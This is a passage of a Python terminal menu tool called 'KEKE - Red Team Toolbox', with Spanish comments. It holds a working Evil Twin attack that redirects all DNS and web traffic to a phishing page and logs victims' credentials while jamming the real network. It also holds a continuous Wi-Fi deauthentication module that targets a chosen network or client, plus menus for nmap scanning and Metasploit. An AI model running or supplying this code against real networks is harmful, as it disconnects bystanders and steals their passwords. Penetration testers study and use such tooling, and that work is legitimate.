        
        # 5. Configurar dnsmasq para DHCP y DNS
        print("[*] Configurando dnsmasq para DHCP/DNS...")
        dnsmasq_conf = f"""interface={ap}
dhcp-range=10.0.0.10,10.0.0.250,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
log-dhcp
address=/#/10.0.0.1
"""
        with open("/tmp/dnsmasq_evil.conf", "w") as f:
            f.write(dnsmasq_conf)
        os.system(f"sudo dnsmasq -C /tmp/dnsmasq_evil.conf -d >/dev/null 2>&1 &")
        time.sleep(1)
        
        # 6. Configurar iptables para redirección
        print("[*] Configurando redirección de tráfico (iptables)...")
        os.system("sudo iptables --flush")
        os.system("sudo iptables --table nat --flush")
        os.system("sudo iptables -P FORWARD ACCEPT")
        os.system(f"sudo iptables -t nat -A POSTROUTING -o {ap} -j MASQUERADE")
        os.system("sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80")
        os.system("sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination 10.0.0.1:80")
        
        # 7. Iniciar servidor HTTP para phishing
        print("[*] Iniciando servidor web de phishing...")
        os.chdir(web_dir)
        os.system(f"sudo python3 {web_dir}/capture.py >/dev/null 2>&1 &")
        time.sleep(1)
        
        # 8. Iniciar deauth en background
        print(f"[*] Iniciando deauthentication con {mon_deauth}...")
        if deauth_mode == "broadcast":
            os.system(f"sudo aireplay-ng --deauth 0 -a {target['bssid']} {mon_deauth} >/dev/null 2>&1 &")
        else:
            # Para dirigido, podrías agregar lógica para clientes específicos
            os.system(f"sudo aireplay-ng --deauth 0 -a {target['bssid']} {mon_deauth} >/dev/null 2>&1 &")
        
        # 9. Mostrar estado y esperar
        print("\n[!] EVIL TWIN ACTIVO - Esperando víctimas...")
        print(f"[!] Credenciales se guardarán en: {web_dir}/credentials.log")
        print("[!] Presiona Ctrl+C para detener el ataque en cualquier momento.\n")
        
        # Mantener el ataque activo hasta interrupción
        while True:
            time.sleep(1)
            # Opcional: mostrar credenciales capturadas en tiempo real
            cred_file = f"{web_dir}/credentials.log"
            if os.path.exists(cred_file):
                with open(cred_file, "r") as f:
                    lines = f.readlines()
                    if lines:
                        print(f"\r[+] Credenciales capturadas: {len(lines)} - Última: {lines[-1].strip()[:60]}...")
                        
    except KeyboardInterrupt:
        print("\n[!] Ataque interrumpido manualmente.")
    finally:
        limpiar_ataque_evil()
        print("\n[Presiona ENTER para regresar al menú principal]")
        input()


# ==========================================
# GESTIÓN DE DEAUTHENTICATION (UNICAST/MULTICAST)
# ==========================================
DEAUTH_STATE = {
    "iface": None,
    "mon_iface": None,
    "target": {},
    "clients": [],
    "attack_type": "broadcast",
    "client_mac": "FF:FF:FF:FF:FF:FF",
    "count": "0"
}

def limpiar_deauth_ataque():
    """Detiene aireplay y restaura la interfaz a modo managed"""
    print("\n[*] Deteniendo procesos y restaurando interfaces...")
    os.system("sudo pkill -f aireplay-ng 2>/dev/null")
    os.system(f"sudo airmon-ng stop {DEAUTH_STATE['mon_iface']} 2>/dev/null || true")
    os.system("sudo systemctl restart NetworkManager 2>/dev/null 2>&1")
    print("[+] Limpieza completada. Interfaz restaurada.")

def generar_menu_interfaces_deauth():
    """Menú 1: Selección de interfaz para el ataque"""
    menu = Menu("SELECCIONAR INTERFAZ PARA DEAUTHENTICATION")
    interfaces = obtener_interfaces()
    if not interfaces:
        menu.agregar_opcion("No se detectaron interfaces", AccionBash("Error", "echo 'Conecta un adaptador WiFi compatible.'"))
        return menu
    for iface in interfaces:
        menu.agregar_opcion(f"Usar {iface}", AccionMenuDinamico(f"Configurar {iface}", lambda i=iface: escanear_redes_deauth(i)))
    return menu

def escanear_redes_deauth(iface):
    """Menú 2: Activa modo monitor, escanea 15s y genera menú con redes detectadas"""
    DEAUTH_STATE["iface"] = iface
    curses.endwin(); os.system('clear')
    print(f"[*] Activando modo monitor en {iface}...")
    
    # Aseguramos que nada interfiera y desbloqueamos la tarjeta
    os.system("sudo airmon-ng check kill > /dev/null 2>&1")
    os.system("sudo rfkill unblock wifi > /dev/null 2>&1")
    os.system(f"sudo airmon-ng start {iface} > /dev/null 2>&1")

    # Detección 100% precisa consultando el sistema de archivos
    if os.path.exists(f"/sys/class/net/{iface}mon"):
        DEAUTH_STATE["mon_iface"] = f"{iface}mon"
    else:
        DEAUTH_STATE["mon_iface"] = iface
        
    mon = DEAUTH_STATE["mon_iface"]
    print(f"[*] Escaneando entorno WiFi con {mon} (15 seg)...")
    
    scan_base = "/tmp/deauth_scan"
    os.system(f"sudo rm -f {scan_base}-01.csv")
    os.system(f"sudo timeout 15s airodump-ng {mon} -w {scan_base} --output-format csv > /dev/null 2>&1")

    redes = []
    clientes_map = {}
    try:
        with open(f"{scan_base}-01.csv", "r", errors="ignore") as f:
            contenido = f.read()
            partes = contenido.split("Station MAC,")
            for linea in partes[0].split("\n")[2:]:
                r = linea.split(",")
                if len(r) >= 14 and ":" in r[0]:
                    redes.append({"bssid": r[0].strip(), "ch": r[3].strip(), "essid": r[13].strip() if r[13].strip() else "<Oculta>"})
            if len(partes) > 1:
                for linea in partes[1].split("\n")[1:]:
                    c = linea.split(",")
                    if len(c) >= 6 and ":" in c[0]:
                        bssid = c[5].strip()
                        mac = c[0].strip()
                        if bssid not in clientes_map: clientes_map[bssid] = []
                        clientes_map[bssid].append(mac)
    except: pass

    if not redes:
        menu = Menu("ESCÁNEO FINALIZADO")
        menu.agregar_opcion("No se encontraron redes (Regresar)", AccionBash("Info", "echo 'Intenta de nuevo o acércate al objetivo.'"))
        return menu

    menu_red = Menu("SELECCIONAR RED OBJETIVO")
    for red in redes:
        DEAUTH_STATE["clients"] = clientes_map.get(red["bssid"], [])
        cant = len(DEAUTH_STATE["clients"])
        texto = f"{red['essid']} (CH:{red['ch']} | {red['bssid']} | Clientes: {cant})"
        menu_red.agregar_opcion(texto, AccionMenuDinamico("Target Set", lambda r=red: seleccionar_modo_deauth(r)))
    return menu_red

def seleccionar_modo_deauth(target):
    """Menú 3: Elegir entre Broadcast o Unicast"""
    DEAUTH_STATE["target"] = target
    menu = Menu(f"TIPO DE ATAQUE: {target['essid']}")
    menu.agregar_opcion("Broadcast/Multicast (Desconectar TODOS los clientes)", AccionMenuDinamico("Set Broadcast", lambda: configurar_cantidad_deauth("broadcast")))
    menu.agregar_opcion("Unicast (Desconectar un cliente específico)", AccionMenuDinamico("Set Unicast", lambda: seleccionar_cliente_deauth()))
    return menu

def seleccionar_cliente_deauth():
    """Menú 4: Solo aparece si hay clientes asociados. Selección por MAC"""
    menu = Menu("SELECCIONAR CLIENTE OBJETIVO")
    clientes = DEAUTH_STATE["clients"]
    if not clientes:
        menu.agregar_opcion("No hay clientes detectados. Usa la opción Broadcast.", AccionBash("Info", "echo 'Regresa y selecciona Broadcast.'"))
        return menu
    for mac in clientes:
        menu.agregar_opcion(f"Desautenticar: {mac}", AccionMenuDinamico("Client Set", lambda m=mac: configurar_cantidad_deauth("unicast", m)))
    return menu

def configurar_cantidad_deauth(tipo, mac_cliente="FF:FF:FF:FF:FF:FF"):
    """Menú 5: Configurar intensidad del ataque"""
    DEAUTH_STATE["attack_type"] = tipo
    DEAUTH_STATE["client_mac"] = mac_cliente
    menu = Menu("INTENSIDAD DEL ATAQUE DE DEAUTHENTICATION")
    menu.agregar_opcion("Continuo (Ataque persistente hasta salir)", AccionMenuDinamico("Start Continuous", lambda: ejecutar_deauth("0")))
    menu.agregar_opcion("1 Ráfaga (5 paquetes)", AccionMenuDinamico("Start 1 Burst", lambda: ejecutar_deauth("5")))
    menu.agregar_opcion("3 Ráfagas (15 paquetes)", AccionMenuDinamico("Start 3 Bursts", lambda: ejecutar_deauth("15")))
    return menu

def ejecutar_deauth(count):
    """Ejecución final: Lanza aireplay-ng, maneja salida y limpia"""
    curses.endwin(); os.system('clear')
    target = DEAUTH_STATE["target"]
    mon = DEAUTH_STATE["mon_iface"]
    client = DEAUTH_STATE["client_mac"]

    print("="*60)
    print("[!] INICIANDO ATAQUE DE DEAUTHENTICATION")
    print(f"    Interfaz Monitor : {mon}")
    print(f"    Red Objetivo     : {target['essid']} ({target['bssid']}) CH:{target['ch']}")
    print(f"    Cliente Objetivo : {'Broadcast (Todos)' if client == 'FF:FF:FF:FF:FF:FF' else client}")
    print(f"    Tipo de Paquetes : {'Continuo (-0)' if count=='0' else f'{count} paquetes'}")
    print("="*60)
    print("[*] Ejecutando aireplay-ng...")
    print("[!] Presiona Ctrl+C para detener el ataque en modo continuo.\n")

    cmd = f"sudo aireplay-ng -0 {count} -a {target['bssid']}"
    if client != "FF:FF:FF:FF:FF:FF":
        cmd += f" -c {client}"
    cmd += f" {mon}"

    try:
        subprocess.run(cmd, shell=True)
    except KeyboardInterrupt:
        print("\n[!] Ataque interrumpido manualmente.")
    finally:
        limpiar_deauth_ataque()
        print("\n[Presiona ENTER para regresar al menú principal]")
        input()

# ==========================================
# 6. ÁRBOL DE MENÚS Y COMPILACIÓN
# ==========================================
def main(stdscr):

    menu_objetivo = Menu("CONFIGURACIÓN DE OBJETIVO")
    menu_objetivo.agregar_opcion("Escanear toda la red (Activar Rango /24)", AccionPython("Activar Rango", cambiar_rango, True))
    menu_objetivo.agregar_opcion("Escanear solo la IP (Desactivar Rango)", AccionPython("Desactivar Rango", cambiar_rango, False))
    menu_objetivo.agregar_opcion("Ingresar IP o Dominio Manualmente", AccionPython("IP Manual", ingresar_ip_manual))

    # Ahora utilizamos SESSION_DIR para que todo caiga en la carpeta con la fecha actual
    menu_nmap = Menu("AUDITORÍA NMAP")
    menu_nmap.agregar_opcion("Descubrimiento de hosts", AccionBash("Host Discovery", f"nmap -sn {{TARGET}} -oN {SESSION_DIR}/00_hosts.txt"))
    menu_nmap.agregar_opcion("Escaneo de puertos comunes", AccionBash("Common Ports", f"nmap -sS {SCAN_SPEED} --top-ports 1000 {{TARGET}} -oN {SESSION_DIR}/01_common.txt"))
    menu_nmap.agregar_opcion("Escaneo completo TCP (optimizado)", AccionBash("Full TCP", f"nmap -sS -p- {SCAN_SPEED} {MIN_RATE} {{TARGET}} -oN {SESSION_DIR}/02_full_tcp.txt"))
    menu_nmap.agregar_opcion("Escaneo de servicios y versiones", AccionBash("Services & Versions", f"nmap -sV --version-intensity 5 {{TARGET}} -oN {SESSION_DIR}/03_services.txt"))
    menu_nmap.agregar_opcion("Detección de sistemas operativos", AccionBash("OS Detection", f"nmap -O --osscan-guess {{TARGET}} -oN {SESSION_DIR}/04_os.txt"))
    menu_nmap.agregar_opcion("Escaneo UDP (puertos comunes)", AccionBash("UDP Scan", f"nmap -sU --top-ports 100 {SCAN_SPEED} {{TARGET}} -oN {SESSION_DIR}/05_udp.txt"))
    menu_nmap.agregar_opcion("Escaneo de vulnerabilidades con NSE", AccionBash("Vuln Scan", f"nmap --script vuln,exploit {{TARGET}} -oN {SESSION_DIR}/06_vuln.txt"))
    menu_nmap.agregar_opcion("Escaneo agresivo completo", AccionBash("Aggressive Scan", f"nmap -A -p- {SCAN_SPEED} {{TARGET}} -oN {SESSION_DIR}/07_aggressive.txt"))
    menu_nmap.agregar_opcion("Detección de firewall/IDS", AccionBash("Firewall Evasion", f"nmap -sA -p 80,443,22,21,25 {{TARGET}} -oN {SESSION_DIR}/08_firewall.txt"))
    menu_nmap.agregar_opcion("Scripts específicos de servicios", AccionBash("Service Scripts", f"nmap --script http-enum,ssh-auth-methods,smb-enum-shares,ftp-anon {{TARGET}} -oN {SESSION_DIR}/09_scripts.txt"))
    menu_nmap.agregar_opcion("Auditoría de SSL/TLS", AccionBash("SSL/TLS Audit", f"nmap --script ssl-enum-ciphers,ssl-cert,ssl-date,ssl-heartbleed -p 443,8443 {{TARGET}} -oN {SESSION_DIR}/10_ssl.txt"))
    menu_nmap.agregar_opcion("Traceroute de red", AccionBash("Traceroute", f"nmap --traceroute {{TARGET}} -oN {SESSION_DIR}/11_traceroute.txt"))
    
    cmd_auto = f"echo '[+] Iniciando escaneo automatizado completo...' && " \
               f"nmap -sn {{TARGET}} -oN {SESSION_DIR}/12a_auto_discovery.txt && " \
               f"nmap -sS -p- {SCAN_SPEED} {MIN_RATE} {{TARGET}} -oN {SESSION_DIR}/12b_auto_ports.txt && " \
               f"nmap -sV -sC {{TARGET}} -oN {SESSION_DIR}/12c_auto_services.txt && " \
               f"echo '[+] Batería completada. Resultados en {SESSION_DIR}/'"
    menu_nmap.agregar_opcion("Escaneo completo automatizado", AccionBash("Automated Scan", cmd_auto))
    
    menu_nmap.agregar_opcion("=> LEER RESULTADOS GUARDADOS <=", AccionMenuDinamico("Explorador", generar_menu_carpetas))

# ==========================================
# MENU ESCANE0 DE PUERTOS
# ==========================================

    menu_reconocimiento = Menu("RECONOCIMIENTO (Information Gathering)")
    menu_reconocimiento.agregar_opcion("Mostrar Objetivo Actual", AccionBash("Echo Target", "echo 'El objetivo configurado actualmente es: {TARGET}'"))
    menu_reconocimiento.agregar_opcion("Configurar Objetivo / Rango", menu_objetivo)
    menu_reconocimiento.agregar_opcion("Menú de Auditoría Nmap (14 Modos)", menu_nmap) 

# ==========================================
# MENU AUDITORIA INALAMBRICA
# ==========================================

    menu_wireless = Menu("AUDITORÍA INALÁMBRICA (WiFi)")
    menu_wireless.agregar_opcion("Activar Modo Monitor (Seleccionar Interfaz)", AccionMenuDinamico("Modo Monitor", generar_menu_monitor))
    menu_wireless.agregar_opcion("Iniciar Captura Automatizada de Handshake", AccionMenuDinamico("Seleccionar Interfaz", generar_menu_interfaces_captura))
    menu_wireless.agregar_opcion("Explorador de Capturas (Visor TUI y Ranger)", AccionMenuDinamico("Explorador WiFi", generar_menu_carpetas_wifi))
    menu_wireless.agregar_opcion("Ataque Evil Twin + Deauth (Automático) ", AccionMenuDinamico("Evil Twin", generar_menu_interfaces_evil))
    menu_wireless.agregar_opcion("Desautenticación WiFi (Unicast/Multicast) ", AccionMenuDinamico("Deauth", generar_menu_interfaces_deauth))



    menu_explotacion = Menu("EXPLOTACIÓN Y POST-EXPLOTACIÓN") 
    menu_explotacion.agregar_opcion("Iniciar Metasploit Framework", AccionBash("MSFConsole", "msfconsole -q -x 'help'"))
    menu_explotacion.agregar_opcion("Buscar Exploits (SearchSploit)", AccionBash("SearchSploit", "searchsploit linux privilege escalation"))

    menu_principal = Menu("KEKE - RED TEAM TOOLBOX")
    menu_principal.agregar_opcion("Cambiar Dirección MAC (Macchanger)", AccionMenuDinamico("Interfaces", generar_menu_interfaces))
    menu_principal.agregar_opcion("Reconocimiento e Inteligencia", menu_reconocimiento)
    menu_principal.agregar_opcion("Auditoría Inalámbrica", menu_wireless)
    menu_principal.agregar_opcion("Explotación", menu_explotacion)
    menu_principal.agregar_opcion("Actualizar Repositorios Locales", AccionBash("Apt Update", "sudo apt update && sudo apt upgrade"))

    app = AplicacionTUI(stdscr, menu_principal)
    app.ejecutar()

if __name__ == "__main__":
    curses.wrapper(main)